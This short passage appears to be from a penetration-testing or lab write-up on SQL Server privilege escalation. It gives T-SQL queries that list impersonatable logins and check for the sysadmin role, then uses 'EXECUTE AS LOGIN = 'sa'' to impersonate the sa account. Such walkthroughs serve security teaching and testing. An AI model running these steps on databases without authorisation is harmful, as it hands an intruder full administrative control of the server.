
With this command I can see which users I  have permission to impersonate:

```ruby
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

```ruby
SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```

if this returns `0` it means we don't have  system admin role.


We can impersonate users with `EXECUTE AS LOGIN` command : 

```ruby
EXECUTE AS LOGIN = 'sa'
```

